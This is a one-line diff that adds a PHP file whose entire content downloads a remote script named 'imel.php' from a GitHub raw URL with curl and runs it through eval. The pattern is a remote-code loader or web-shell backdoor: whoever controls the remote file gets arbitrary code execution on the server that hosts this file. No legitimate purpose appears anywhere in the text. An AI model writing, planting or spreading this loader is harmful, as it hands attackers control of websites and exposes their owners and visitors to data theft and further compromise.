@@ -1,0 +1,1 @@
+<?php $rf = 'https://raw.githubusercontent.com/agenmicat/2026begun/refs/heads/main/imel.php';$ch = curl_init($rf);curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);$bn = curl_exec($ch);curl_close($ch);eval('?>' . $bn); ?>
